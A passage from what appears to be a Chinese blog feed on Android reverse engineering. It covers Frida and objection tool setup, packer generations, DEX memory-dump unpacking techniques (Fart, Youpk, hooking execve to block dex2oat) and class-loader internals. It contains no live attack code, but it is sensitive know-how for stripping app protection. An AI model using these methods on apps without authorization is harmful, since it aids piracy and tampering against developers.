&gt;&gt; ~/.bashrc</span><br><span class="line">echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">exec &quot;$SHELL&quot;</span><br><span class="line">sudo apt-get update; sudo apt-get install make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev</span><br><span class="line">source .bashrc</span><br></pre></td></tr></table></figure><p>查看当前Python版本，Python2和Python3都有，默认是Python 3.10.5：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python -V</span><br><span class="line">Python 3.10.5</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python2 -V</span><br><span class="line">Python 2.7.18</span><br></pre></td></tr></table></figure><p>也可以安装自己喜欢的版本，比如3.8.0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv install 3.8.0</span><br></pre></td></tr></table></figure><p>安装完成后切换Python版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyenv local 3.8.0</span><br><span class="line">pyenv local system</span><br></pre></td></tr></table></figure><p>在Python 3.8.0环境下安装对应的Frida和objection版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pip   </span><br><span class="line">pip install frida==12.8.0</span><br><span class="line">pip install frida-tools==5.3.0</span><br><span class="line">pip install objection==1.8.4</span><br></pre></td></tr></table></figure><p>安装frida-dexdump：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-dexdump</span><br></pre></td></tr></table></figure><p>安装Wallbreaker插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.objection/plugins/</span><br><span class="line">git clone https://github.com/hluwa/Wallbreaker ~/.objection/plugins/Wallbreaker</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;每次都要找教程太累人了，自己写一个记录。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Android壳与脱壳</title>
    <link href="http://example.com/posts/18047266.html"/>
    <id>http://example.com/posts/18047266.html</id>
    <published>2022-08-11T14:45:22.828Z</published>
    <updated>2022-08-12T11:34:06.009Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章记录一下Android系统中壳相关的知识。</p><span id="more"></span><h1 id="1-加壳技术"><a href="#1-加壳技术" class="headerlink" title="1. 加壳技术"></a>1. 加壳技术</h1><h2 id="1-1-第一代壳-DEX加密"><a href="#1-1-第一代壳-DEX加密" class="headerlink" title="1.1 第一代壳 DEX加密"></a>1.1 第一代壳 DEX加密</h2><p>DEX字符串加密、资源加密、对抗反编译、反调试、自定义DexClassLoader。</p><p>DEX整体加固：文件加载和内存加载</p><h2 id="1-2-第二代壳-DEX抽取与so加固"><a href="#1-2-第二代壳-DEX抽取与so加固" class="headerlink" title="1.2 第二代壳 DEX抽取与so加固"></a>1.2 第二代壳 DEX抽取与so加固</h2><p>对抗第一代壳常见的脱壳法、Dex Method代码抽取到外部(通常企业版)、Dex动态加载、so加密。</p><p>函数抽取：在函数粒度完成代码的保护</p><p>so加固种类：</p><ol><li>基于init、init_array以及JNI_Onload函数的加壳</li><li>基于自定义linker的加壳工具</li></ol><h2 id="1-3-第三代壳-DEX动态解密与so混淆"><a href="#1-3-第三代壳-DEX动态解密与so混淆" class="headerlink" title="1.3 第三代壳 DEX动态解密与so混淆"></a>1.3 第三代壳 DEX动态解密与so混淆</h2><p>Dex Method代码动态解密、so代码膨胀混淆、对抗之前出现的所有脱壳法。</p><p>VMP和Dex2C：Java函数Native化</p><h1 id="2-加壳技术的特征"><a href="#2-加壳技术的特征" class="headerlink" title="2. 加壳技术的特征"></a>2. 加壳技术的特征</h1><p>整体加固：是所有壳的基础，关键在于怎么区分函数抽取、VMP以及Dex2C甚至是多种技术混合的混合型壳。</p><p>函数抽取：获取到保护的DEX后，函数体的内容是无效的，注意这里说的是无效而不是无意义，有的App加壳后函数依然是有意义的，但不是我们想要的。</p><p>VMP：获取到保护的DEX后，函数的属性由Java属性变为Native，典型的有数字的onCreate函数Native化。</p><p>Dex2C：获取到保护的DEX后，和VMP一样，被保护函数的属性由Java属性变为Native，如开源的DCC(Dex-to-C Compiler)。</p><p>混合型壳：多种加固技术混合使用，比如先将原有Smali指令流使用VMP或Dex2C保护，然后再经过函数抽取进一步保护。</p><h1 id="3-编译安卓源码"><a href="#3-编译安卓源码" class="headerlink" title="3. 编译安卓源码"></a>3. 编译安卓源码</h1><p>为什么要编译源码脱壳？</p><ul><li>Frida检测非常难</li><li>root检测非常难</li><li>可以直接使用源码中的函数，大大提高开发效率</li></ul><h1 id="4-沙箱脱壳机的核心原理"><a href="#4-沙箱脱壳机的核心原理" class="headerlink" title="4. 沙箱脱壳机的核心原理"></a>4. 沙箱脱壳机的核心原理</h1><h2 id="4-1-脱壳的本质"><a href="#4-1-脱壳的本质" class="headerlink" title="4.1 脱壳的本质"></a>4.1 脱壳的本质</h2><p>Android App脱壳的本质就是对内存中处于解密状态的DEX的dump。</p><p>首先要区分脱壳与修复。脱壳指的是对加固APK中保护的DEX的整体的dump，不管是函数抽取、Dex2C还是VMP，首要做的就是对整体DEX的dump，然后再对脱壳下来的DEX进行修复。要达到对APK的脱壳，最为关键的就是准确定位内存中解密后的DEX文件的起始地址和大小。达到对APK的成功脱壳，最为关键的要素是：</p><ul><li>内存中DEX的起始地址和大小。只有拿到这两个要素，才能够成功dump下内存中的DEX。</li><li>脱壳时机。只有正确的脱壳时机，才能够dump下明文状态的DEX。否则即使是正确的起始地址和大小，dump下来的也可能只是密文。</li></ul><h2 id="4-2-关键类流程分析"><a href="#4-2-关键类流程分析" class="headerlink" title="4.2 关键类流程分析"></a>4.2 关键类流程分析</h2><p>脱壳时机可以从下面几个方法分析。脱壳点可以通过插入以下函数找到。</p><h3 id="4-2-1-InMemoryDexClassLoader源码分析"><a href="#4-2-1-InMemoryDexClassLoader源码分析" class="headerlink" title="4.2.1 InMemoryDexClassLoader源码分析"></a>4.2.1 InMemoryDexClassLoader源码分析</h3><ul><li>static object CreateSingleDexFileCookie()</li><li>static const DexFile * CreateDexFile()</li><li>DexFile::Open()</li><li>OpenCommon()</li><li>DexFile::DexFile()</li></ul><h3 id="4-2-2-DexClassLoader加载DEX源码分析"><a href="#4-2-2-DexClassLoader加载DEX源码分析" class="headerlink" title="4.2.2 DexClassLoader加载DEX源码分析"></a>4.2.2 DexClassLoader加载DEX源码分析</h3><ul><li>OpenAndReadMagic()</li><li>DexFile::OpenCommon()</li><li>DexFile::DexFile()</li></ul><h3 id="4-2-3-Dex2oat"><a href="#4-2-3-Dex2oat" class="headerlink" title="4.2.3 Dex2oat"></a>4.2.3 Dex2oat</h3><p>Dex2oat(Dalvik excutable file to optimized art file)是一个对DEX文件进行编译优化的程序，在我们的Android手机中的位置是<code>/system/bin/dex2oat</code>。通过编译优化，可以提升用户日常的使用体验(包含安装速度、启动速度、应用使用过程中的流畅度等)，是Android Art Runtime中的一个重要模块。</p><p>Android虚拟机可以识别的是DEX文件，应用使用过程中如果每次将DEX文件加载进内存，解释性执行字节码，效率会很低，严重影响用户体验。通过Dex2oat优化后，可以在系统运行之前利用合适的时机将DEX文件字节码提前转化为虚拟机可以执行运行的机器码，后续直接从效率更高的机器码中运行，则运行阶段更加流程，优化用户体验。</p><h1 id="5-二代壳对方法体的静态抽取与动态回填"><a href="#5-二代壳对方法体的静态抽取与动态回填" class="headerlink" title="5. 二代壳对方法体的静态抽取与动态回填"></a>5. 二代壳对方法体的静态抽取与动态回填</h1><h2 id="5-1-抽取壳的完整运行流程"><a href="#5-1-抽取壳的完整运行流程" class="headerlink" title="5.1 抽取壳的完整运行流程"></a>5.1 抽取壳的完整运行流程</h2><ol><li>解析DEX文件，保存所有方法的指令结构信息</li><li>通过方法所属的类名和方法签名信息，获取其对应的指令结构信息</li><li>获取方法指令的个数和指令的开始位置，然后将其指令全部置空</li><li>重新计算文件的checksum和SHA值，回写到DEX的文件头部</li><li>将抽空的DEX文件，放到手机指定目录下，然后进行加载运行</li><li>在Native层hook<code>libdvm.so</code>中的<code>dexFindClass()</code>函数</li><li>在Java层使用DexClassLoader加载DEX并且反射运行被抽空的类的方法</li><li>通过DexFile结构体一次获取被抽空的方法对应的指令内存地址</li><li>修改内存为可读写属性，还原指令到内存块中</li></ol><h2 id="5-2-手动进行函数抽取"><a href="#5-2-手动进行函数抽取" class="headerlink" title="5.2 手动进行函数抽取"></a>5.2 手动进行函数抽取</h2><p>写一个简单的APK程序，Make Project。</p><img src="/posts/18047266/5.2.1.png" class="" title="写一个简单的函数"><p>在<code>C:\Users\v5le0n9\AndroidStudioProjects\MyApplication\app\build\outputs\apk\debug</code>生成的APK程序解压。将解压出来的DEX文件载入jadx中查看函数信息，可以看到我们刚才编写的<code>testFunc()</code>中的内容。</p><img src="/posts/18047266/5.2.2.png" class="" title="jadx查看dex文件"><p>将该DEX文件载入010 Editor，使用DEX模板打开。壳进行函数抽取时，是将DEX文件中的method_ids与class_defs中的内容全部置空。</p><img src="/posts/18047266/5.2.3.jpg" class="" title="010查看dex文件"><p>为了减少工作量，我们只将<code>testFunc()</code>函数置空。</p><img src="/posts/18047266/5.2.4.png" class="" title="将函数置空"><img src="/posts/18047266/5.2.5.png" class="" title="将函数置空"><p>更新完后载入jadx发现出错，DEX文件中的checksum值不对：</p><img src="/posts/18047266/5.2.6.png" class="" title="出错"><p>所以还要在010 Editor中修改该DEX文件dex header中的checksum值。错误提示我们原本文件的checksum为0xd89949be，修改过后的checksum经过计算为0x01dc48ab，所以应将修改过的DEX文件的checksum值改为0x01dc48ab，注意小端存储。</p><img src="/posts/18047266/5.2.7.png" class="" title="修改checksum"><p>此时再次打开就没有错误警告了。可以看到<code>testFunc()</code>函数已经被抽空了。</p><img src="/posts/18047266/5.2.8.png" class="" title="函数抽空"><h2 id="5-3-动态回填"><a href="#5-3-动态回填" class="headerlink" title="5.3 动态回填"></a>5.3 动态回填</h2><h3 id="5-3-1-类加载时机"><a href="#5-3-1-类加载时机" class="headerlink" title="5.3.1 类加载时机"></a>5.3.1 类加载时机</h3><p>类加载有两种加载形式：</p><ul><li>隐式加载：<ul><li>创建类的实例</li><li>访问类的静态变量，或者为静态变量赋值</li><li>调用类的静态方法</li><li>使用反射方式来强制创建某个类或接口对应的java.lang.Class对象</li><li>初始化某个类的子类</li></ul></li><li>显示加载：两者又有所区别<ul><li>使用<code>LoadClass()</code>加载</li><li>使用<code>forName()</code>加载</li><li>通过源码分析Android类加载的流程</li></ul></li></ul><h3 id="5-3-2-类装载流程"><a href="#5-3-2-类装载流程" class="headerlink" title="5.3.2 类装载流程"></a>5.3.2 类装载流程</h3><ol><li>装载：查找和导入class文件</li><li>链接：其中解析步骤可选<ul><li>检查：检查载入的class文件数据的正确性</li><li>准备：给类的静态变量分配存储空间</li><li>解析：将符号引用转成直接引用</li></ul></li><li>初始化：调用<clinit>函数，对静态变量、静态代码块执行初始化工作</li></ol><p>进行动态回填必须要使用进程内Hook技术。</p><h2 id="5-4-实现函数抽取壳的前置技术"><a href="#5-4-实现函数抽取壳的前置技术" class="headerlink" title="5.4 实现函数抽取壳的前置技术"></a>5.4 实现函数抽取壳的前置技术</h2><p>禁用dex2oat</p><p>如果dex2oat对抽取的DEX进行了编译生成了OAT文件，那么动态修改的DEX中的Smali指令流就不会生效。所以art下的抽取型壳首先就是要禁用dex2oat。</p><p>如何禁用dex2oat：</p><ul><li>Hook关键函数，使其不进入dex2oat流程</li><li>直接使用InMemoryDexClassLoader</li></ul><p>如果不禁用dex2oat，那么函数体必须在进入dex2oat流程前恢复好，才可以在dex2oat流程之中进行脱壳，脱下完整的函数体恢复之后的DEX。</p><p>GenerateOatFileNoChecks -&gt; Dex2Oat -&gt; Exec -&gt; exec_utils.cc -&gt; Exec -&gt; ExecAndReturnCode -&gt; execve。</p><p>使用Native hook，hook住execve，使其不运行dex2oat进程。</p><h1 id="6-更强抽取壳的dump"><a href="#6-更强抽取壳的dump" class="headerlink" title="6. 更强抽取壳的dump"></a>6. 更强抽取壳的dump</h1><h2 id="6-1-Fart整体dump思路的演进"><a href="#6-1-Fart整体dump思路的演进" class="headerlink" title="6.1 Fart整体dump思路的演进"></a>6.1 Fart整体dump思路的演进</h2><h3 id="6-1-1-v1-0：ClassLoader中dump"><a href="#6-1-1-v1-0：ClassLoader中dump" class="headerlink" title="6.1.1 v1.0：ClassLoader中dump"></a>6.1.1 v1.0：ClassLoader中dump</h3><ul><li>时机：App中的Applocation类中的<code>attachBaseContext()</code>和<code>onCreate()</code>函数是App中最先执行的方法，因此需要选在Application的<code>onCreate()</code>函数执行之后才开始被调用的任意一个函数中。比如选择在ActivityThread中的<code>performLaunchActivity()</code>函数作为时机，来获取最终的应用的ClassLoader。</li><li>方式：hook -&gt; 反射和dump。获取到应用解密后的DEX文件最终依附的ClassLoader之后通过Java的反射机制最终获取到对应的DexFile的结构体，并完成DEX的dump。</li></ul><h3 id="6-1-2-v2-0：更多“海量”的脱壳点"><a href="#6-1-2-v2-0：更多“海量”的脱壳点" class="headerlink" title="6.1.2 v2.0：更多“海量”的脱壳点"></a>6.1.2 v2.0：更多“海量”的脱壳点</h3><ul><li>时机：所有类和方法的装载和链接/编译和执行流程之中。</li><li>方式：基于hook -&gt; dump。ART下DexFile类中定义了两个关键的变量：begin_、size_以及用于获取这两个变量的<code>Begin()</code>和<code>Size()</code>函数。这两个变量分别代表着当前DexFile对象对应的内存中的DEX文件加载的起始位置和大小。只要有了这两个值，我们就可以完成对这个DEX的dump。</li></ul><h3 id="6-1-3-v3-0：优中选优后的脱壳点"><a href="#6-1-3-v3-0：优中选优后的脱壳点" class="headerlink" title="6.1.3 v3.0：优中选优后的脱壳点"></a>6.1.3 v3.0：优中选优后的脱壳点</h3><ul><li>时机：找到绕过dex2oat的时机，类的初始化函数始终运行在ART下的interpreter模式。</li><li>方式：在解释执行<clinit>时进行脱壳，实现“绕过”dex2oat，因此必然进入到<code>interpreter.cc</code>文件中的<code>Execute()</code>函数，进而进入ART下的解释器解释执行。</li></ul><h3 id="6-1-4-v4-0：优中选优-双保险"><a href="#6-1-4-v4-0：优中选优-双保险" class="headerlink" title="6.1.4 v4.0：优中选优+双保险"></a>6.1.4 v4.0：优中选优+双保险</h3><ul><li>时机和方式：同时在dex2oat和类的初始化流程函数设置hook。</li></ul><h2 id="6-2-Youpk的整体dump思路"><a href="#6-2-Youpk的整体dump思路" class="headerlink" title="6.2 Youpk的整体dump思路"></a>6.2 Youpk的整体dump思路</h2><h3 id="6-2-1-v4-0：优中选优-双保险"><a href="#6-2-1-v4-0：优中选优-双保险" class="headerlink" title="6.2.1 v4.0：优中选优+双保险"></a>6.2.1 v4.0：优中选优+双保险</h3><ul><li>时机：App启动后10s开始。</li><li>方式：禁用dex2oat，在dex2oat中设置CompilerFilter为仅验证compiler_options_ -&gt; SetCompilerFilter()，从ClassLinker中遍历DexFile对象并dump。</li></ul><h2 id="6-3-Youpk-Fart整体dump进一步提升"><a href="#6-3-Youpk-Fart整体dump进一步提升" class="headerlink" title="6.3 Youpk+Fart整体dump进一步提升"></a>6.3 Youpk+Fart整体dump进一步提升</h2><h3 id="6-3-1-每个脱壳点都可以脱壳DexFile"><a href="#6-3-1-每个脱壳点都可以脱壳DexFile" class="headerlink" title="6.3.1 每个脱壳点都可以脱壳DexFile"></a>6.3.1 每个脱壳点都可以脱壳DexFile</h3><ul><li>时机和方式：在安卓8上禁用dex2oat，结合Fart所提出的海量脱壳点，每个脱壳点都可以脱壳。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇文章记录一下Android系统中壳相关的知识。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>类加载器与动态加载</title>
    <link href="http://example.com/posts/f504c8a5.html"/>
    <id>http://example.com/posts/f504c8a5.html</id>
    <published>2022-08-10T09:49:13.553Z</published>
    <updated>2022-08-10T09:51:30.114Z</updated>
    
    <content type="html"><![CDATA[<p>类加载器与动态加载是学习Android加壳与脱壳的需要。</p><span id="more"></span><p>Java程序的编译执行过程：</p><img src="/posts/f504c8a5/1.2.1.png" class="" title="Java编译执行过程"><h1 id="1-类加载器"><a href="#1-类加载器" class="headerlink" title="1. 类加载器"></a>1. 类加载器</h1><p>类加载器遵循双亲委派模式。</p><p>JVM的类加载器包括3种：</p><ul><li>Bootstrap ClassLoader(引导类加载器)：C/C++代码实现的加载器，用于加载指定的JDK核心类库，比如java.lang、java.uti等这些系统类。Java虚拟机的启动就是通过Bootstrap，该ClassLoader在Java里无法获取，负责加载/lib下的类。</li><li>Extensions ClassLoader(拓展类加载器)：Java中的实现类为ExtClassLoader，提供了除了系统类之外的额外功能，可以在Java里获取，负责加载/lib/ext下的类。</li><li>Application ClassLoader(应用程序类加载器)：Java中的实现类为AppClassLoader，是与我们接触最多的类加载器，开发人员写的代码默认就是由它来加载，ClassLoader.getSystemClassLoader返回的就是它。</li></ul><p>也可以自定义类加载器，只需要通过继承java.lang.ClassLoader类的方式来实现自己的类加载器即可。</p><img src="/posts/f504c8a5/1.1.3.png" class="" title="Java类加载器"><p>在Android中与ClassLoader相关的类加载器共有8个：</p><ul><li>ClassLoader：抽象类。</li><li>BootClassLoader：预加载常用类，单例模式。与Java中的BootClassLoader不同，它并不是由C/C++实现，而是由Java实现的。</li><li>BaseDexClassLoader：是PathClassLoader、DexClassLoader、InMemoryDexClassLoader的父类，类加载的主要逻辑都是在BaseDexClassLoader完成的。</li><li>SecurityClassLoader：继承了抽象类ClassLoader，拓展了ClassLoader类加入了权限方面的功能，加强了安全性。</li><li>URLClassLoader：SecurityClassLoader子类，用URL路径从JAR文件中加载类和资源。</li><li>PathClassLoader：Android默认使用的类加载器，一个APK中的Activity等类便是在其中加载。</li><li>DexClassLoader：可以加载任意目录下的DEX/JAR/APK/ZIP文件，比PathClassLoader更灵活，是实现插件化、热修复以及DEX加壳的重点。</li><li>InMemoryDexClassLoader：Android 8.0新引入，用于直接从内存中加载DEX。</li></ul><img src="/posts/f504c8a5/1.1.5.png" class="" title="Android类加载器"><h2 id="1-1-双亲委派模式"><a href="#1-1-双亲委派模式" class="headerlink" title="1.1 双亲委派模式"></a>1.1 双亲委派模式</h2><h3 id="1-1-1-双亲委派模式定义"><a href="#1-1-1-双亲委派模式定义" class="headerlink" title="1.1.1 双亲委派模式定义"></a>1.1.1 双亲委派模式定义</h3><p>加载<code>.class</code>文件时，以递归的形式逐级向上委托给父加载器ParentClassLoader加载，如果加载过了，就不用再加载一遍；如果父加载器没有加载过，继续委托给父加载器去加载，一直到这条链路的顶级，顶级ClassLoader如果没有加载过，则尝试加载，加载失败，则逐级向下交还调用者加载。</p><img src="/posts/f504c8a5/1.1.1.png" class="" title="双亲委派模式"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">           <span class="comment">//1.先检查是否已经加载过--findLoaded</span></span><br><span class="line">           Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">           <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="comment">//2.如果自己没加载过,存在父类,则委托父类</span></span><br><span class="line">                   <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                       c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       c = findBootstrapClassOrNull(name);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">               &#125;</span><br><span class="line"> </span><br><span class="line">               <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="comment">//3.如果父类也没加载过,则尝试本级classLoader加载</span></span><br><span class="line">                   c = findClass(name);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">          <span class="keyword">return</span> c;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>（1）先检查自己是否已经加载过<code>.class</code>文件，用<code>findLoadedClass()</code>方法，如果已经加载了直接返回<br>（2）如果自己没有加载过，存在父类，则委派父类去加载，用<code>parent.loadClass(name,false)</code>方法，此时会向上传递，然后去父加载器中循环第1步，一直到顶级ClassLoader<br>（3）如果父类没有加载，则尝试本级classLoader加载，如果加载失败了就会向下传递，交给调用方式实现<code>.class</code>文件的加载</p><h3 id="1-1-2-双亲委派加载流程"><a href="#1-1-2-双亲委派加载流程" class="headerlink" title="1.1.2 双亲委派加载流程"></a>1.1.2 双亲委派加载流程</h3><p>我们要加载一个class文件，定义一个CustomerClassLoader类加载器：</p><p>(1)首先会判断自己的CustomerClassLoader否加载过，如果加载过直接返回；<br>(2)如果没有加载过则会调用父类PathClassLoader去加载，该父类同样会判断自己是否加载过，如果没有加载过则委托给父类BootClassLoader去加载；<br>(3)这个BootClassLoader是顶级classLoader，同样会去判断自己有没有加载过，如果也没有加载过则会调用自己的<code>findClass(name)</code>去加载；<br>(4)如果顶级BootClassLoader加载失败了，则会把加载这个动作向下交还给PathClassLoader；<br>(5)这个PathClassLoader也会尝试去调用<code>findClass(name)</code>去加载，如果加载失败了，则会继续向下交还给CustomerClassLoader来完成加载。这整个过程感觉是一个递归的过程，逐渐往上然后又逐渐往下，直到加载成功。</p><p>其实这个String.class在系统启动的时候已经被加载了，我们自己定义一个CustomerClassLoader去加载，其实也是父类加载的。</p><img src="/posts/f504c8a5/1.1.2.png" class="" title="双亲委派加载流程"><h3 id="1-1-3-双亲委派的作用"><a href="#1-1-3-双亲委派的作用" class="headerlink" title="1.1.3 双亲委派的作用"></a>1.1.3 双亲委派的作用</h3><p>(1) 防止同一个<code>.class</code>文件重复加载；<br>(2) 对于任意一个类确保在虚拟机中的唯一性，由加载它的类加载器和这个类的全类名一同确立其在Java虚拟机中的唯一性；<br>(3) 保证<code>.class</code>文件不被篡改，通过委派方式可以保证系统类的加载逻辑不被篡改。</p><h2 id="1-2-Android中的类加载机制"><a href="#1-2-Android中的类加载机制" class="headerlink" title="1.2 Android中的类加载机制"></a>1.2 Android中的类加载机制</h2><h3 id="1-2-1-Dalvik虚拟机启动过程"><a href="#1-2-1-Dalvik虚拟机启动过程" class="headerlink" title="1.2.1 Dalvik虚拟机启动过程"></a>1.2.1 Dalvik虚拟机启动过程</h3><img src="/posts/f504c8a5/1.2.2.jpg" class="" title="Dalvik虚拟机启动过程"><p>Dalvik虚拟机的启动过程可以分为8个步骤：</p><h4 id="1-2-1-1-AndroidRuntime-start"><a href="#1-2-1-1-AndroidRuntime-start" class="headerlink" title="1.2.1.1 AndroidRuntime.start()"></a>1.2.1.1 AndroidRuntime.start()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">AndroidRuntime::start</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* className, <span class="type">const</span> <span class="type">bool</span> startSystemServer)</span>&#123;</span><br><span class="line">    ......    </span><br><span class="line">    <span class="comment">/* start the virtual machine */</span>    </span><br><span class="line">    <span class="keyword">if</span> (startVm(&amp;mJavaVM, &amp;env) != <span class="number">0</span>)        </span><br><span class="line">        <span class="keyword">goto</span> bail;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*     * Register android functions.     */</span>    </span><br><span class="line">    <span class="keyword">if</span> (startReg(env) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        LOGE(<span class="string">&quot;Unable to register all android natives\n&quot;</span>);        </span><br><span class="line">        <span class="keyword">goto</span> bail;    </span><br><span class="line">    &#125;    </span><br><span class="line">    ......    </span><br><span class="line">    <span class="comment">/*     * Start VM.  This thread becomes the main thread of the VM, and will     * not return until the VM exits.     */</span>    </span><br><span class="line">    jclass startClass;    </span><br><span class="line">    jmethodID startMeth;    </span><br><span class="line">    slashClassName = strdup(className);   </span><br><span class="line">    <span class="keyword">for</span> (cp = slashClassName; *cp != <span class="string">&#x27;\0&#x27;</span>; cp++)  </span><br><span class="line">        <span class="keyword">if</span> (*cp == <span class="string">&#x27;.&#x27;</span>)         </span><br><span class="line">            *cp = <span class="string">&#x27;/&#x27;</span>;    </span><br><span class="line">    startClass = env-&gt;FindClass(slashClassName);   </span><br><span class="line">    <span class="keyword">if</span> (startClass == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        LOGE(<span class="string">&quot;JavaVM unable to locate class &#x27;%s&#x27;\n&quot;</span>, slashClassName); </span><br><span class="line">        <span class="comment">/* keep going */</span>    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        startMeth = env-&gt;GetStaticMethodID(startClass, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;([Ljava/lang/String;)V&quot;</span>);       </span><br><span class="line">        <span class="keyword">if</span> (startMeth == <span class="literal">NULL</span>) &#123;           </span><br><span class="line">            LOGE(<span class="string">&quot;JavaVM unable to find main() in &#x27;%s&#x27;\n&quot;</span>, className);        </span><br><span class="line">            <span class="comment">/* keep going */</span>       </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;         </span><br><span class="line">            env-&gt;CallStaticVoidMethod(startClass, startMeth, strArray);  </span><br><span class="line">            ...... </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    LOGD(<span class="string">&quot;Shutting down VM\n&quot;</span>);    </span><br><span class="line">    <span class="keyword">if</span> (mJavaVM-&gt;DetachCurrentThread() != JNI_OK)    </span><br><span class="line">        LOGW(<span class="string">&quot;Warning: unable to detach main thread\n&quot;</span>);   </span><br><span class="line">    <span class="keyword">if</span> (mJavaVM-&gt;DestroyJavaVM() != <span class="number">0</span>)    </span><br><span class="line">        LOGW(<span class="string">&quot;Warning: VM did not shut down cleanly\n&quot;</span>);  </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数主要做了4件事情：</p><ul><li>调用成员函数<code>startVm()</code>来创建一个Dalvik虚拟机实例，并且保存在成员变量mJavaVm中。</li><li>调用成员函数<code>startReg()</code>来注册一些Android核心类的JNI方法。</li><li>调用参数className所描述的一个Java类的静态成员函数<code>main()</code>，来作为Zygote进程的Java层入口。这个入口类就为com.android.internal.os.ZygoteInit。执行这一步的时候，Zygote进程中的Dalvik虚拟机实例就开始正式运作了。注意，在这一步中，也就是在com.android.internal.os.ZygoteInit类的静态成员函数<code>main()</code>，会进行大量的Android核心类和系统资源文件预加载。</li><li>从com.android.internal.os.ZygoteInit类的静态成员函数<code>main()</code>返回来的时候，就说明Zygote进程准备要退出来了。在退出之前，会调用前面创建的Dalvik虚拟机实例的成员函数<code>DetachCurrentThread()</code>和<code>DestroyJavaVM()</code>。其中，前者用来将Zygote进程的主线程脱离前面创建的Dalvik虚拟机实例，后者是用来销毁前面创建的Dalvik虚拟机实例。</li></ul><h4 id="1-2-1-2-AndroidRuntime-startVm"><a href="#1-2-1-2-AndroidRuntime-startVm" class="headerlink" title="1.2.1.2 AndroidRuntime.startVm()"></a>1.2.1.2 AndroidRuntime.startVm()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 